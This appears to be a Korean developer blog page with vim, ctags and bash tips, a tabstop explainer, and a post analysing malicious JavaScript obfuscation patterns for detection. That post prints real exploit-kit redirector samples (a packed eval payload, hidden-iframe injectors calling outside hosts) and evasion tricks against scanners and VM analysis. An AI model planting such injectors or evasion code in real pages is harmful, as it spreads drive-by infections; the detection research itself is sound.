<p>expandtab 을 할 경우에는 ts 를 할 필요없이 sts 만 해줘도 된다.</p>

<p>그리고</p>

<pre>
noremap &lt;CR> :
</pre>


<p>를 했는데.</p>

<p>ESC : 로 커맨드모드를 진입하면 : 를 누를때 SHIFT 를 같이 눌러야해서,
손이 아팠는데, 이제는 ESC ENTER 로 커맨드모드 진입이 가능해진다.</p>

<p>손이 한결 편해진다.</p>

<h4>10 J</h4>

<p>그리고 vim 에서 흔히 텐제이라고 부르는 매핑.</p>

<pre>
map &lt;C-j> 10j
map &lt;C-k> 10k
</pre>


<p>로 빠르게 상하이동이 가능하다. Ctrl + J / Ctrl + K</p>

<h4>Indentation</h4>

<p>Code indentation 은 visual mode 에서 &lt; &lt; 로 할 수 있는데, 좀 더 편하게 하기 위해서
visual mode non-recursive mapping 을 추가한다.</p>

<pre><code>vnoremap &lt; &lt;gv
vnoremap &gt; &gt;gv
</code></pre>

<p>이렇게 하면, Visual mode 에서 &lt; 를 연속으로 눌러 indentation 을 들이거나 낼 수 있다.
파이썬같이 인덴테이션이 중요한 언어에서는 꼭 필요한 매핑이다.</p>

<p>vim 팁으로는,</p>

<p>코드 인덴팅할때, 편리한 vim 커맨드.</p>

<pre>
5&lt;&lt;
Vjj&lt;
&lt;%
]p
</pre>


<h4>.vimrc</h4>

<pre><code>nnoremap &lt;leader&gt;ev :vsplit $MYVIMRC&lt;cr&gt;
</code></pre>

<p>하면 편하게 .vimrc 를 에디팅할 수 있다.</p>

<h4>Rails</h4>

<p>Rails 를 사용한다면, route 화일이나 DB 스키마를 에디트할 경우가 많다. 그래서 다음 매크로가 유용하다.</p>

<pre><code>command! Rroutes :e config/routes.rb
command! Rschema :e db/schema.rb
</code></pre>

<h4>Vim Plugin</h4>

<p>vim plugin 중에서는 Command-T, Solarized, YouCompleteMe, Taglist 를 사용.</p>

<p>Taglist 를 쓸 경우, .vimrc 에 (OS X 에서 brew 로 Exuberant ctags 를 깔았을 경우)</p>

<pre><code>nnoremap &lt;silent&gt; &lt;F8&gt; :TlistToggle&lt;CR&gt;
let Tlist_Ctags_Cmd='/usr/local/Cellar/ctags/5.8/bin/ctags'
</code></pre>

<p><F8> 로 클래스/함수 pane 을 on/off 시킬 수 있다.</p>

<p>YouCompleteMe 때문에, OS X 에서는 MacVim 에 딸려오는 Vim 을 사용한다 (nogui). 만약 SIGSEGV 가 발생하면, 아마 python library 가 잘못 링크되었을 경우인데, 임시로 brew unlink python 으로 python 라이브러리 쫑나는 것 해결할 수 있다.</p>

<p>MacVim 은 <a href="http://github.com/b4winckler/macvim/downloads">여기서</a> 다운받아 컴파일한다.</p>

<p>Ubuntu 에서는 ruby 와 python 써포트를 On 하고, 링크되는 라이브러리에 신경을 써서 새로 컴파일하는 것이 좋다. 12.04 에 딸려오는 vim 이 너무 구식이라.</p>

<p>OS X iTerm2 터미널도 Solarize 할 수 있는 스크립이 찾아보면 있으니. <a href="altercation/solarized/iterm2-colors-solarized">https://github.com/altercation/solarized</a></p>

<p>그리고, Linux gnome 의 경우도 github 에 <a href="sigurdga/gnome-terminal-colors-solarized">https://github.com/sigurdga/gnome-terminal-colors-solarized</a> 로 찾으면 나옴.</p>

<p>vim colorscheme 만 solarized 를 쓰면 terminal 로 돌아올때 번쩍해서 눈이 피곤하다. 둘 다 맞춰주는 것이 좋다.</p>

<p>Command-T 를 설치할 때, Linux 는 간단한데, OS X 는 약간 까다롭다.</p>

<p>$ vim &ndash;version 으로 vim 컴파일에 사용된 FLAG 랑 맞춰주는 것이 기본인데,
OS X Mountain Lion 에서는
처음에 아무생각없이 build 했다가 SIGSEGV 이 발생해서,</p>

<pre>
vim --version|grep arch
vim --version|grep ruby
ARCHFLAGS="-arch x86_64"
rbenv local system 
ruby --version
ruby extconf.rb
make
</pre>


<p>rbenv 로 /usr/bin/ruby 가 실행되게 하는 것.
ruby 버전이 1.8.7 인지 확인하는 것.
vim 이 컴파일된 아키텍쳐와 루비 써포트를 확인하는 것.</p>

<p>vim 이 +ruby 가 아니라면, <a href="http://stackoverflow.com/questions/3794895/installing-vim-with-ruby-support-ruby">Installing vim with ruby support (+ruby)</a> 참조.</p>

<p>15 인치 노트북에서 화면 가득한 iTerm 을 띄워놓고,
vim window + vim tab + tmux pane + tmux screen 을 활용하면,
마우스나 트랙패드를 사용할 필요가 없다.</p>

<p>iTerm 과 크롬을 한개씩 띄워놓고 개발이 가능해진다.</p>

<p>CMD-TAB 과 크롬 단축기를 사용하면, 키보드에서 손을 뗄 필요가 없어진다.</p>

<p>참고로 iTerm 의 경우 CMD+OPTION+1 등으로 윈도우를 선택할 수 있다.</p>

<h4>Vim Key Mapping</h4>

<p>그리고 vim key mapping 에 관한 좋은 글
Mapping keys in Vim - Tutorial -
<a href="http://vim.wikia.com/wiki/Mapping_keys_in_Vim_-_Tutorial_(Part_1)">here</a></p>

<p>vim 으로 hex edit 하는 법</p>

<pre><code>:%!xxd
:%!xxd -r
</code></pre>

<p>다량의 Tab 을 열어놓고 작업하다가 한꺼번에 닫고 나갈때,</p>

<pre><code>:qa
:wqa
</code></pre>

<p>하면 된다.</p>

<h3>irb</h3>

<p>ruby 를 사용하면 irb 를 많이 쓰게되는데, irb 에서 vi key 를 쓰는 방법.</p>

<pre><code>$ vim ~/.editrc
bind -v
bind \\t rl_complete
</code></pre>

<p>이렇게 하면 ESC i j k l 등으로 이동할 수 있고, TAB 으로 completion 을 할 수 있다.</p>

<p>python REPL 에서도 먹는다. Emacs 스타일보다 Vim 스타일이 더 편하다.</p>

<h3>ctags &amp; cscope</h3>

<p>Python 코딩은 OS X 보다는 Linux 에서 작업하는데,</p>

<pre><code>sudo apt-get install ctags 
</code></pre>

<p>~/.ctags 에다가</p>

<pre><code>--python-kinds=-i
</code></pre>

<p>그리고 .vimrc 에다가</p>

<pre><code>set tags=./mytags
</code></pre>

<p>그리고</p>

<pre><code>ctags -R -o ./mytags ~/code
</code></pre>

<p>를 해두면,</p>

<p>vim 에서,</p>

<pre><code>vim -t &lt;tag name&gt;
Ctrl-] / Ctrl-T
:tselect / :stselect
:tnext / :tprev
:help tags
</code></pre>

<p>으로 tag 들을 navigating 할 수 있다.</p>

<p>그리고 ctags v.s. cscope 에 관한 좋은 글 <a href="http://stackoverflow.com/questions/934233/cscope-or-ctags-why-choose-one-over-the-other">cscope or ctags why choose one over the other?</a></p>

<p>그리고, OS X 에서 Exuberant ctags 를 사용해서 python 등을 코딩하고 싶다면,
Homebrew 를 사용해 인스톨한다. 오리지널 ctags 는 /usr/bin/ctags 에 있을 것이고,
새로 인스톨된 것은 /usr/local 아래 어딘가 있을 듯.</p>

<pre><code>$ brew install ctags-exuberant
</code></pre>

<p>/usr/local/bin/ctags 가 실행되도록 확인하고, 마찬가지로 ~/.ctags 에</p>

<pre><code>--python-kinds=-i
</code></pre>

<p>추가.</p>

<p>ctags 에 관한 좋은 블로그 <a href="http://www.scholarslab.org/research-and-development/code-spelunking-with-ctags-and-vim/">Code Spelunking with Ctags and Vim</a></p>

<p>그리고 pycscope 을 쓸수도 있는데,</p>

<p>OS X 에서는 <code>brew install cscope</code> 해주고, cscope_maps.vim 을 ~/vim/plugin 아래에 설치한다.
그리고 pycscope 도 설치한다. <code>pycscope -R .</code> cscope_maps.vim 도 추가.</p>

<p><a href="http://cscope.sourceforge.net/cscope_vim_tutorial.html">The Vim/Cscope tutorial</a></p>

<p>개인적으로는 cscope 이 ctags 보다 편하다.</p>

<p><code>Ctrl-\</code>+<code>c</code> 나 <code>Ctrl-\</code>+<code>s</code> 그리고, <code>Ctrl-\</code>+<code>d</code></p>

<h3>ack &amp; z jumper</h3>

<p>ack 가 grep 보다 소스코드에서 뭐 찾을때 훨 편하다.</p>

<p>그리고 디렉토리 navigation 은 z jumper 가 최고다. 예전의 노턴 ncd 같은 녀석.</p>

<h3>bash</h3>

<p>스크린캐스트에서 본 쉘 커맨드.</p>

<pre><code>~/code/jade[master]% find . -iname "*.rb" | 
xargs grep -h '^[[:space:]]*class\|module\b' | 
sed 's/^[[:space:]]*//' | grep -v '^#' | cut -d ' ' -f 2 | 
while read class; 
do echo `grep -rl "\b$class\b" app lib --include "*.rb" |wc -l` $class ; 
done | sort -n
</code></pre>

<p>한 줄이다. ruby 의 클래스를 참조하는 화일 갯수를 세는건데.</p>

<ul>
<li>grep -l 옵션은 화일에서 패턴 존재가 확인되면 그냥 스킵. 존재 여부를 확인할때.</li>
<li>grep -r 은 디렉토리 리커시브.</li>
<li>grep -v 는 패턴이 없는 라인을 출력.</li>
<li>grep -h 는 화일 이름을 출력 안함.</li>
<li>find &hellip; | xargs 가 find &hellip; -exec 보다 빠르다.</li>
<li>sort -n 은 numerical sort 를 하란 것인데, 그냥 sort 하면 &ldquo;10&rdquo; 이 &ldquo;2&rdquo; 보다 앞에 나온다. -n 을 해주면 &ldquo;2&rdquo; 가 &ldquo;10&rdquo; 보다 먼저 나오게 된다.</li>
</ul>


<h3>zsh</h3>

<p>zsh 에서는 Global alias 이용해</p>

<pre><code>alias -g G='|grep '
</code></pre>

<p>하면</p>

<pre>
cat log G ERROR
</pre>


<p>와 같은 커맨드가 가능하다.</p>

<h3>bash I/O redirection</h3>

<p><a href="http://www.cyberciti.biz/faq/bash-while-loop/">Bash While Loop Example</a> 에서.</p>

<pre><code>cmd &gt;&gt;file.txt 2&gt;&amp;1
</code></pre>

<p> stderr, stdout 을 함께 화일에 append 할 때.</p>

<pre><code>#!/bin/bash
FILE=$1
exec 3&lt;&amp;0
exec 0&lt;$FILE
while read line
do
  echo $line
done
exec 0&lt;&amp;3
</code></pre>

<p> stdin 을 3 에 카피해놓고, 화일을 stdin 으로 돌리고, 나중에 원복.</p>

<pre><code>#!/bin/bash
x=1
while [ $x -le 5 ]
do
  echo "$x times"
  x=$(( $x + 1 ))
done
</code></pre>

<p>bash 의 arithmetic operator 는 (( )) 이다.</p>

<pre><code>#!/bin/sh
counter=$1
factorial=1
while [ $counter -gt 0 ]
do
  factorial=$(( $factorial * $counter ))
  counter=$(( $counter - 1 ))
done
echo $factorial
</code></pre>

<p>factorial 구하는 것.</p>

<pre><code>#!/bin/sh
while :
do
  read -p "Enter two numbers ( -1 to quit ) : " a b
  if [ $a -eq -1 ]
  then
    break
  fi
  ans=$(( a + b ))
  echo $and
done
</code></pre>

<p>읽을만한 shell scripting 문서: <a href="http://bash.cyberciti.biz/guide/Main_Page">Linux Shell Scripting Tutorial (LSST) v2.0</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/12/tabs/">Tabs</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-06-12T11:48:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:48 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Ted Logan&rsquo;s <a href="http://tedlogan.com/techblog3.html">Secrets of tabs in vim</a> 에서 읽은 내용을 정리.</p>

<p>Vim 에서.</p>

<p>vim 에서 눈에 보이는 indentation 은 &lsquo;\t&rsquo; 와 space 의 조합으로 이루어져 있음.</p>

<p>tabstop 은,
&lsquo;\t&rsquo; 을 렌더링할 때 기준이 될 hard 한 column grid 의 간격을 결정함.</p>

<p>일반적으로 tabstop 과 softtabstop 을 같게 설정하나,</p>

<p>tabstop 과 softtabstop 의 개념을 설명하기 위해서</p>

<p>굳이 다르게 설정해보겠음.</p>

<p>noexpandtab 기준으로 설명하면,</p>

<p>:set tabstop=4 softtabstop=4 noexpandtab 입력 후
1[TAB]2[TAB]3[TAB]4 입력.</p>

<p>화면에 이렇게 나타남.</p>

<pre>
1234567890123456789012345678901234567890
1   2   3   4
</pre>


<p>[RETURN] 치고, :set tabstop=4 softtabstop=3 noexpandtab 입력 후
동일하게 1[TAB]2[TAB]3[TAB]4 입력.</p>

<pre>
1234567890123456789012345678901234567890
1   2   3   4
1  2  3  4  5
</pre>


<p>이제 :set list 로 특수문자 표시.</p>

<pre>
1234567890123456789012345678901234567890$
1^I2^I3^I4$
1  2  3^I 4^I5$
</pre>


<p>그럼, 설명 시작.</p>

<p>tabstop=4
softtabstop=3
일 경우.</p>

<p>[TAB] 키를 누르면,
soft 한 tab grid 는 3 column 간격으로 이루어져 있지만,
hard 한 tab grid 는 4 column 간격으로 이루어져 있기 때문에,
둘째줄 처음 2,3 는 space 만 가지고 전진했고, 4 는 &lsquo;\t&rsquo; + space 로 전진.</p>

<p>즉 noexpandtab 일 경우, softtabstop 그리드와 (hard)tabstop 그리드가
틀리니까, vim 이 &lsquo;\t&rsquo; 와 space 조합으로 인덴테이션을 만들어냄.</p>

<p>정리하면 tabstop 는 &lsquo;\t&rsquo; 를 포지셔닝할 그리드를 만들때 사용.
softtabstop 는 눈에 보이는 그리드.</p>

<p>tabstop != softtabstop 일 경우, &lsquo;\t&rsquo; 만으로 softtabstop 그리드에 인덴트할 수
없기때문에, space 로 메꿔줌.</p>

<p>그런데, 인덴테이션이 &lsquo;\t&rsquo; + space 로 만들어지면,
space 파트는 안변하지만 &lsquo;\t&rsquo; 파트는 tabstop 에 따라서 달라짐.</p>

<p>문제는 어떤 인덴트는 space 만으로, 어떤 인덴트는 &lsquo;\t&rsquo; + two spaces 로,
이런 식으로 중구난방이기 때문에, tabstop 이 달라지면 인덴트가 다 깨짐.</p>

<p>그럼으로 인덴테이션은 &lsquo;\t&rsquo; 이나 space 어느 한가지만으로 만들어지는게 좋음.</p>

<p>softtabstop == tabstop 은 같게 하면 좋음.</p>

<p>당연한 이야기를 어렵게 설명했음.</p>

<p>shiftwidth 는 [TAB] 이 아니라 vim 의 &lt; &lt; / > > 로 reindent 할 때 사용됨.</p>

<p>:set tabstop=8 softtabstop=8 shiftwidth=8 noexpandtab</p>

<p>으로 일치를 시켜주던가.</p>

<p>아니면,</p>

<p>:set softtabstop=4 shiftwidth=4 expandtab</p>

<p>으로 &lsquo;\t&rsquo; 를 space 로 대체하면, tabstop 에 영향받지도 않고 굳이 설정할 필요도 없음.</p>

<p>Ruby 사용자라면,</p>

<p>:set ts=2 sts=2 sw=2 expandtab</p>

<p>이 적절.</p>

<p>Tab 을 눈에 보이게 하는 법.</p>

<pre><code>syntax match Tab /\t/
hi Tab gui=underline guifg=blue ctermbg=blue
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/01/javascript-obfuscation-patterns/">JavaScript Obfuscation Patterns</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-06-01T14:14:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2013</span></span> <span class='time'>2:14 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>정리하는 목적은 Malicious JavaScript 을 자동으로 판정하기 위함.</p>

<p>그러기 위해서, 악성 자바스크립트에서 쓰는 syntax pattern 을 정리하고, 자동으로 패턴을 찾아내는 것을
만들려고 함.</p>

<p>지금 생각하는 수순은</p>

<ol>
<li>단순한 regexp 스트링 매칭</li>
<li>HTML Parsing</li>
<li>JavaScript Parsing -> Abstract Syntax Tree 를 빌드해서, visit 하면서, 패턴을 분석</li>
<li>JavaScript Runtime 을 돌려서 동적으로 생성되는 Symbol table 이나
Assignment , String mainpulation 을 분석</li>
</ol>


<p>그리고 Drive-by-download 공격의 redirection 의 단계마다 JavaScript Obfuscation 의 패턴이 조금씩 달라지기 때문에.
이 점도 고려할 필요가 있음.</p>

<ol>
<li>랜딩페이지에는 주로 다음 단계로 redirection 하는 코드들이 들어있다.</li>
</ol>


<p>중국의 Hidden Lynx 가 수행했다고 의심되는 작전에서 사용된 redirection code</p>

<pre><code>document.write('&lt;script 
src="http://www.*******curling.com/Docs/BW06/iframe.js"&gt;&lt;/script&gt;');
</code></pre>

<p>Gongda pack 으로 traffic 을 돌리기 위해 사용된 redirection code</p>

<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
</code></pre>

<p>난독화를 해제하면,</p>

<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
    var expires = new Date();
    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
}
</code></pre>

<p>redirection 을 하기 위해서 들어가는 코드들은</p>

<ul>
<li>간결하고,</li>
<li>document.write() 로 iframe or script tag 를 뱉어내거나</li>
<li><p>createElement() 로 script / iframe tag 을 집어 넣는다.</p></li>
<li><p>다음 단계에서는, 주로 php 가 돌면서 browser fingerprinting 을 하고 적절한 exploit 을 보내준다.
1 번과 2 번에 들어가는 악성 JavaScript 은 성격이나 패턴이 조금 다르다는 점도 염두에 두려 한다.</p></li>
</ul>


<h2>Patterns</h2>

<h3>Execution</h3>

<p>난독화된 코드를 수행시키는 방법으로는, <code>eval()</code> <code>setTimeout()</code> <code>setInterval()</code> 등이 사용된다.</p>

<h3>Function redefinition</h3>

<p>eval(), unescape(), fromCharCode(), replace(), ActiveXObject() 등의 수상한 함수들을 감추기 위해 사용한다.</p>

<pre><code>&gt; var e=eval;
&gt; var a=1;
&gt; e("a=a+1");
2
&gt;
</code></pre>

<p>IDS, IPS, AV 의 패턴 패칭을 우회하기 위해 사용된다.</p>

<h3>document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</h3>

<p>JavaScript 에서는 method 도 결국 property 에 불과하기때문에, function 을 document[&ldquo;write&rdquo;] 로 부를 수 있다.
여기서 좀 더 꼬면 document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</p>

<p>DOM 환경이 아니라서, document.write() 라는 함수를 정의해서 테스트한다.</p>

<pre><code>&gt; document = { write: function(str) { console.log(str); } }
{ write: [Function] }
&gt; document.write('hi')
hi
&gt; document["w"+"r"+"ite"]('hi')
hi
&gt;
</code></pre>

<p>아니면 &ldquo;write&rdquo; 를 변수에 담아서 호출할수도 있다.</p>

<pre><code>&gt; document = { write: function() { console.log("hi"); } }
{ write: [Function] }
&gt; document.write()
hi
&gt; a = "w"+"r"+"i"+"t"+"e";
'write'
&gt; document[a]();
hi
&gt;
</code></pre>

<p>주로 <code>document.write()</code> <code>document.writeln()</code> <code>this.eval()</code> <code>window.eval()</code> 등에 사용한다.
브라우저에서 JavaScript Global Scope 에서는 this === window 이기 때문에,
, <code>this.eval()</code> === <code>window.eval()</code></p>

<h3>Funciton redefinition 2</h3>

<p>node 에서 돌려보자.</p>

<p>node 환경이라서 기본적인 DOM 오브젝이 없다. 대강 window.eval() 을 만들어준다.</p>

<pre><code>&gt; window = { eval: function() { console.log('eval') } }
{ eval: [Function] }
&gt; window.eval()
eval
&gt; v = "va"+"l"
'val'
&gt; window[""+"e"+v]()
eval
&gt;
</code></pre>

<p>즉 function redefinition 패턴 + document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;] 패턴을 결합하여</p>

<pre><code>v = "va"+"l"
e = window[""+"e"+v]
</code></pre>

<p><code>eval()</code> 함수를 <code>e()</code> 로 은밀하게 옮겼다. 앞으로 <code>e()</code> 를 <code>eval()</code> 대신 사용할 수 있다.</p>

<h3>Function redefinition 3</h3>

<pre><code>b={v:{q:{x:this}}}.v.q.x;
qq='ghej4vabl'
q=qq[2]+qq[5]+qq[6]
q=q+qq[8]
w={v:b[q]}.v
</code></pre>

<p><code>w=eval()</code> 펑션이 들어가게 된다. <code>w=this["eval"]</code> 로 만들어지는 것이 포인트.</p>

<p>이런 패턴을 detect 하려면 방법은 2 가지가 있을 것 같은데.</p>

<ol>
<li>JavaScript runtime 을 붙여서 돌리는 것.</li>
<li>JavaScript Parser 로 AST 를 빌드하고, 변수의 값을 계산해내는 것. (컴파일러 최적화와 유사. Terminal 노드까지 계산이 가능하다면.)</li>
</ol>


<h3>replace()</h3>

<p>&lsquo;OB3S3FUCA!TED!&rsquo;.replace() 을 통해 난독화된 스트링을 풀어서 사용하는 패턴.</p>

<pre><code>&gt; var a;
&gt; eval('a=un2scap2'.replace(/2/g,'e'));
[Function: unescape]
&gt; var str = escape("BABO?!@")
&gt; a(str)
'BABO?!@'
&gt;
</code></pre>

<p>a() 로 unescape() 된다.</p>

<p>Function redefinition 을 그냥 하는 것이 아니라, replace() 를 통해서 스트링을 한번 푼다음에, eval() 로 하였다.</p>

<h3>split()</h3>

<p>스트링을 split() 해서 list 를 만든다. 보통 byte list 을 만드는데.
split() 해서 list 를 만들고, 이 리스트를 Math.sin() 등의 다양한 함수로 가공한 후에, fromCharCode() 로
스트링으로 복원해서 사용한다. eval() 을 한다던지&hellip; Shellcode 로 쓴다던지.</p>

<pre><code>&gt; n="19~50~57~48".split("a~".substr(1));
[ '19', '50', '57', '48' ]
</code></pre>

<p>split() 하는 delimeter 를 숨기기 위해 &ldquo;a~&rdquo;.substr(1) 을 사용하였다.</p>

<h3>unescape()</h3>

<p>%XX%YY 형태로 인코딩 된 녀석을 스트링으로 복원한다.</p>

<h3>fromCharCode()</h3>

<pre><code>&gt; String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);
'http://127.0.0.1:8080//puFbJofTczCYRuAoQ/'
&gt;
</code></pre>

<p><strong>스트링을 split() 해서 list 를 만들고 그 리스트에 Math.sin() 등을 이용한 연산을 돌린 후에,
String.fromCharCode() 로 다시 스트링으로 복원하여, 최후에 eval() 을 돌린다.</strong> 정도가 가능하다.</p>

<p>또 다른 예:</p>

<pre><code>$ cat x.js
var i = 0;

for(i=0;i&lt;"iDMMNvNSME".length;i++) {
    console.log(String.fromCharCode("iDMMNvNSME".charCodeAt(i) ^ 0x21));
}
$ node x.js
H
e
l
l
o
W
o
r
l
d
</code></pre>

<p>&ldquo;HelloWorld&rdquo; 를 0x21 로 XOR 시켜서 저장해놓았다가, 다시 XOR 로 풀어서 <code>fromCharCode()</code> 로
캐릭터화했다.</p>

<h3>Script/Iframe injection</h3>

<p><code>document.write()</code> <code>document.writeln()</code> <code>createElement('script')</code> <code>createElement('iframe')</code> <code>createElement("object")</code> 을
사용하여 동적으로 HTML tag 또는 JS 코드를 삽입/실행시키는 테크닉.</p>

<p>Yang Pack EK 의 Redirector 를 보자.</p>

<pre><code>&lt;script type="text/javascript" src="http://js.xxx.com/2744552/tongji.js"&gt;&lt;/script&gt;&lt;noscript&gt;
&lt;a href="http://www.xxx.com"&gt;&lt;img src="http://img.xxx.com/2744552/tongji.gif" /&gt;&lt;/noscript&gt;

&lt;script language='JavaScript'&gt;
function booom1() { document.write("&lt;iframe src='t.html' width='50' height='1'&gt;&lt;/iframe&gt;");}
...
</code></pre>

<p>document.write() 로 iframe 을 삽입한다.</p>

<p>블랙홀 EK 에서 iframe 을 삽입하는 코드를 보자.</p>

<pre><code>if (document.getElementsByTagName('body')[0]){
    iframer();
} else {
    document.write("&lt;iframe src="http://[removed]/?go=2' width='10' height='10' style="visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
}
function iframer() {
    var f = document.createElement('iframe');
    f.setAttribute('src', 'http://[removed]/?go=2');
    f.style.visibility = 'hidden';
    f.style.position = 'absolute';
    f.style.left = '0';
    f.style.top = '0';
    f.setAttribute('width', '10');
    f.setAttribute('height', '10');
    document.getElementsByTagName('body')[0].appendChild(f);
}
</code></pre>

<p>createElement() 로 iframe 을 삽입한다.</p>

<h3>try { } catch(e) { }</h3>

<pre><code>&gt; Boolean().prototype.a
TypeError: Cannot read property 'a' of undefined
    at repl:1:21
    at REPLServer.self.eval (repl.js:109:21)
    at Interface.&lt;anonymous&gt; (repl.js:248:12)
    at Interface.EventEmitter.emit (events.js:96:17)
    at Interface._onLine (readline.js:200:10)
    at Interface._line (readline.js:518:8)
    at Interface._ttyWrite (readline.js:736:14)
    at ReadStream.onkeypress (readline.js:97:10)
    at ReadStream.EventEmitter.emit (events.js:126:20)
    at emitKey (readline.js:1058:12)
&gt; try { console.log("1"); Boolean().prototype.a; console.log("2"); } catch(e) { console.log('babo'); }
1
babo
&gt;
</code></pre>

<p>try {} 에서 일부러 exception 을 발생시켜서, 수행 중간에 catch {} 로 control flow 를 넘긴다.
정확히 어떤 statement 가 exception 을 발생시키는지 모른다면, control flow 를 짐작할 수 없게 된다.
Control flow obfuscation 패턴.</p>

<h3>Base64</h3>

<p>HTML 의 몇몇 tag 들은 Base64 인코딩을 풀어서 쓸 수 있다.
&lt;img> 를 따로 화일로 안만들고 &lt;img tag 에 base64 인코딩을 해서 HTML 화일 1 장에 다 넣을 수가 있는데,
이것을 이용하는 방법이 있다.
따로 decoding 루틴을 달 필요가 없기에, 간편하다.</p>

<h3>Radix Conversion</h3>

<pre><code>&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
6
&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
6
&gt; 720094129.0.toString(2&lt;&lt;4)
'length'
&gt; -~5
6
&gt;
</code></pre>

<p>따라가보자.</p>

<p><code>720094129.0.toString(2&lt;&lt;4)</code> 는 &lsquo;length&rsquo; 가 된다. toString(radix) 로 <code>2&lt;&lt;4</code> 는 32 니까, 32 진법으로
720094129 를 변환하면 &lsquo;length&rsquo; 가 되는 셈이다. 32 진법에서는 [0-9a-v] 를 사용한다.</p>

<p>&lsquo;0x14f&rsquo;.length 가 되는 셈이고 결국 숫자 5 가 된다. JavaScript 에서 <code>~</code> 는 Bitwise NOT 으로 MSB 가 invert 되니
음수로 바뀌게 된다.</p>

<p>JavaScript 에서</p>

<pre><code>-1 (base 10) = 1111 1111 1111 1111 1111 1111 1111 1111 (base2)
</code></pre>

<p>이다. ~0 은 -1 이 된다. -~ 하면 +1 하는 것과 같다.</p>

<p>function 을 redefine 하는 것으로 다시 가보면</p>

<pre><code>&gt; window={eval:function(){console.log("eval");}}
{ eval: [Function] }
</code></pre>

<p>이제부터 난독화된 본코드</p>

<pre><code>&gt; var x=490837.0.toString(2&lt;&lt;4);window[x]()
eval
&gt;
</code></pre>

<p>32 진수로 변환해서 &lsquo;eval&rsquo; 이라는 스트링을 얻어냈다.
window.eval() 을 아주 힘들게 호출했다. 이 정도까지 가면, 패턴 검색정도로는 &ldquo;eval&rdquo; 이라는 스트링을 찾을 수 없다.</p>

<h3>Math</h3>

<pre><code>&gt; Math.log(Math.E)
1
</code></pre>

<p>-2 가 필요하면 -2*Math.log(Math.E) 를 사용한다. 간단하지만, 수학울렁증이 있으면 멘탈이 흔들린다.</p>

<p>Math.PI 와 Math.sin() 등을 이용해 x = [ 125.5, 49.5, &hellip; ] 등의 리스트를 가공한다음에 fromCharCode() 를 사용해서
스트링으로 원복하는 패턴.</p>

<p>다음에는 그냥 쓸데없이 다양한 radix base 의 숫자를 써서 수학 울렁증을 유발시키는 패턴.</p>

<pre><code>&gt; if(020==0x10) console.log('babo')
babo
</code></pre>

<p>귀찮게 020 == 0x10 등의 conditional 을 중간 중간에 넣어 헤깔리게 만든다.</p>

<h3>OnMouseMove 핸들러</h3>

<pre><code>document.onmousemove = function() {
    ...
    var head = document.getElementsByTagName("head")[0]
    var script = document.createElement("script")
    script.type = "text/javascript"
    script.onreadystatechange = function() {
        if (this.readyState == "complete") window.handler_state = 2;
    }
    script.onload = function() { window.handler_state = 2; }
    script.src = url + "1x2.js"
    head.appendChild(script)
    ...
}
</code></pre>

<p>VM 기반의 자동화된 동적 분석에 대항하기 위한 테크닉. 마우스가 움직이면
&lt;script src=&ldquo;xxx.js&rdquo;> 를 DOM 트리의 &lt;head> 밑에 밀어 넣는다.
자동화된 VM 분석에 대항하면서, Control flow 를 숨기는 패턴.</p>

<ol>
<li>VMware / VirtualBox 를 통해 동적분석을 하려하거나,</li>
<li>JavaScript runtime + DOM emulation 을 가지고 JavaScript 을 인터프리팅하는</li>
</ol>


<p>자동화된 분석 도구를 피해가기 위한 목적이 크다.</p>

<h3>HTML <tag></h3>

<p>HTML tag 에 데이터를 숨기는 기법이다. &lt;iframe> redirection code 를 inject 할 때 자주 사용된다.</p>

<pre><code>&lt;x id="babo" style="display:none"&gt;
123456789
&lt;/x&gt;

&lt;script&gt;
var x= document.getElementById("babo");
alert(x.innerHTML);
&lt;/script&gt;
</code></pre>

<p>&lt;x>&hellip;&lt;/x>  안에 인코딩된 스트링을 숨기고, &lt;script>&lt;/script> 블럭에서 디코딩을 해서,
&lt;iframe> 태그를 document.write 또는 createElement(&lsquo;iframe&rsquo;) 을 통해서 inject 한다.
JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.</p>

<h3>Silly Tricks</h3>

<p>조금씩 비트는 수준의 테크닉들이 있다.</p>

